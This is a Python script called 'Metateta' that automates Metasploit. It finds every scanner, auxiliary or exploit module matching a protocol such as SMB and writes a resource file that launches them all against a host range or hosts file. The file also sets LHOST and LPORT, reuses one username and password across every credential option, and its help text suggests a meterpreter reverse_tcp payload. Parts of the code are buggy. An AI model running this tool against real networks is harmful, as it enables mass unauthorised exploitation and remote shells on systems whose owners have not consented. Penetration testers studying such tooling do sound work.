#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author WazeHell @wazehell
from commands import getoutput
import os,random,sys,optparse


def run_up():
	print("Starting Metasploit ......")
	return os.system("msfconsole -r meta.rc")

def clean():
	return os.system("")

def get_scanners(protocol):
	scanners = []
	cc = 'locate "*auxiliary/scanner/*'+protocol+'*.rb"'
	for ss in getoutput(cc).splitlines():
		start = ss.index( '/modules/' ) + len( '/modules/' )
		end = ss.index( '.rb', start )
		rzlt = ss[start:end]
		scanners.append(rzlt)
	return scanners

def get_auxiliary(protocol):
	auxiliarys = []
	cc = 'locate "*auxiliary/*'+protocol+'*.rb"'
	for ss in getoutput(cc).splitlines():
		start = ss.index( '/modules/' ) + len( '/modules/' )
		end = ss.index( '.rb', start )
		rzlt = ss[start:end]
		auxiliarys.append(rzlt)
	return auxiliarys

def get_exploits(protocol):
	exploits = []
	cc = 'locate "*exploits*'+protocol+'*.rb"'
	for ss in getoutput(cc).splitlines():
		print(ss)
		try:
			start = ss.index( '/modules/' ) + len( '/modules/' )
			end = ss.index( '.rb', start )
			rzlt = ss[start:end]
			exploits.append(rzlt)		
		except:
			pass
	return exploits

def set_targets(rhosts,rhost,lhost,lport,payload,scannerlist,user,password):
	sw = open('meta.rc','a+')
	temp = "setg RHOSTS "+rhosts+" \n"
	temp+= "setg RHOST "+rhost+" \n"
	temp+= "setg SRVHOST "+rhost+" \n"
	temp+= "setg SRVHOSTs "+rhost+" \n"
	temp+= "setg LHOST "+lhost+" \n"
	temp+= "setg LPORT "+lport+" \n"
	temp+= "setg SMBUser "+user+" \n"
	temp+= "setg SMBPass "+password+" \n"
	temp+= "setg USERNAME "+user+" \n"
	temp+= "setg PASSWORD "+password+" \n"
	temp+= "setg USER "+user+" \n"
	temp+= "setg PASS "+password+" \n"
	temp+= "setg FTPUSER "+user+" \n"
	temp+= "setg FTPPASS "+password+" \n"
	temp+= "setg SMTPUSERNAME "+user+" \n"
	temp+= "setg SMTPPASSWORD "+password+" \n"
	temp+= "setg HttpUsername "+user+" \n"
	temp+= "setg HttpPassword "+password+" \n"
	temp+= "setg BasicAuthUser "+user+" \n"
	temp+= "setg BasicAuthPass "+password+" \n"
	temp+= "setg DBPASS "+password+" \n"
	temp+= "setg DBUSER "+user+" \n"
	temp+= "setg IMAPPASS "+password+" \n"
	temp+= "setg IMAPUSER "+user+" \n"
	temp+= "setg SSH_USERNAME "+user+" \n"
	temp+= "setg SSH_PASSWORD "+password+" \n"
	sw.write(temp)
	for scanner in scannerlist:
		da = "use [scanner]"+"\n"
		da+= "run"+"\n"
		fe = da.replace('[scanner]',scanner)
		sw.write(fe)
	sw.close()
	return True

def target_list(hostsfile,protocol,rhosts,rhost,lhost,lport,payload,scannerlist,user,password):
	togo = get_exploits(protocol)
	ff = open(hostsfile,'r')
	for target in ff:
		target = target.rstrip()
		set_targets(target,target,lhost,lport,payload,togo,user,password)
	return True

  

if __name__ == '__main__':
	banner = """
			───▄▄▄
			─▄▀░▄░▀▄
			─█░█▄▀░█
			─█░▀▄▄▀█▄█▄▀
			▄▄█▄▄▄▄███▀
	
	Metateta Automated Tool For Scanning And Exploiting Network Protocols Using Metasploit
	By : WazeHell 

	"""
	print(banner)
	try:           
		parser = optparse.OptionParser()
		parser.add_option('-R',
            action = "store", 
            dest   = "rhosts",
			default = "",
            type   = "string", 
            help = "set remote hosts : run.py -R 192.168.1.8-255")
		parser.add_option('-p',
            action = "store", 
            dest   = "protocol",
			default = "",
            type   = "string", 
            help = "set protocol : run.py -R 192.168.1.8-255 -p smb")
		parser.add_option('-f',
            action = "store", 
            dest   = "hostsfile",
            type   = "string", 
            help = "set hosts file : run.py -f hosts.txt -p smb ")
		parser.add_option('-r',
			action = "store", 
			dest   = "rhost",
			default = "",
			type   = "string", 
			help = "set remote host : run.py -r 192.168.1.15 -p smb")
		parser.add_option('-l',
			action = "store", 
			dest   = "lhost",
			default = "",
			type   = "string", 
			help = "set LHOST : run.py -f hosts.txt -l 192.168.1.5 -p smb")
		parser.add_option('-i',
			action = "store", 
			dest   = "lport",
			default = "",
			type   = "string", 
			help = "set local port : run.py -f hosts.txt -l 192.168.1.5 -i 4444 -p smb")
		parser.add_option('-u',
			action = "store", 
			dest   = "payload",
			default = "",
			type   = "string", 
			help = "set payload : run.py -f hosts.txt -l 192.168.1.5  -i 4444 -u windows/x64/meterpreter/reverse_tcp -p smb")
		parser.add_option('-U',
			action = "store", 
			dest   = "user",
			default = "''",
			type   = "string", 
			help = "set user : run.py -f hosts.txt -U user -P PASS@2WORD -p smb")                                         
		parser.add_option('-P',
			action = "store", 
			dest   = "password",
			default = "''",
			type   = "string", 
			help = "set password : run.py -f hosts.txt -U user -P PASS@2WORD -p smb")
		parser.add_option('-x',
			action = "store", 
			dest   = "use",
			default = "",
			type   = "string", 
			help = "set tool mode : run.py -f hosts.txt -U user -P PASS@2WORD -p smb -x scan")

		(option,args) = parser.parse_args()
			
		if not option.rhost:
			print "Pls Set RHOSTS or RHOST \n"  , parser.print_help()
			sys.exit(0)  
		
		elif not option.rhosts:
			print "Pls Set RHOSTS \n"  , parser.print_help()
			sys.exit(0)  

		elif not option.protocol:
			print "Pls Set Protocol \n"  , parser.print_help()
			sys.exit(0)  

		elif not option.use:
			print "Pls Set Mode : exploit or scan or auxiliary \n"  , parser.print_help()
			sys.exit(0)  
	
		if option.use == 'scan':
			scn = get_scanners(option.protocol)
			if option.hostsfile:
				target_list(option.hostsfile, option.protocol, option.rhosts, option.rhost, option.lhost , option.lport , option.payload , scn , option.user , option.password)
				run_up()
				clean()
			else:
				set_targets(option.rhosts, option.rhost, option.lhost , option.lport , option.payload , scn , option.user , option.password)
				run_up()
				clean()
		elif option.use == 'exploit':
			exp = get_exploits(option.protocol)
			if option.hostsfile:
				target_list(option.hostsfile, option.protocol, option.rhosts, option.rhost, option.lhost , option.lport , option.payload , exp , option.user , option.password)
				run_up()
				clean()
			else:
				set_targets(option.rhosts, option.rhost, option.lhost , option.lport , option.payload , exp , option.user , option.password)
				run_up()
				clean()
		elif option.use == 'auxiliary':
			aux = get_auxiliary(option.protocol)
			if option.hostsfile:
				target_list(option.hostsfile, option.protocol, option.rhosts, option.rhost, option.lhost , option.lport , option.payload , aux , option.user , option.password)
				run_up()
				clean()
			else:
				set_targets(option.rhosts, option.rhost, option.lhost , option.lport , option.payload , aux , option.user , option.password)
				run_up()
				clean()
	except KeyboardInterrupt:
			print('\n Exit.')
			sys.exit(0)
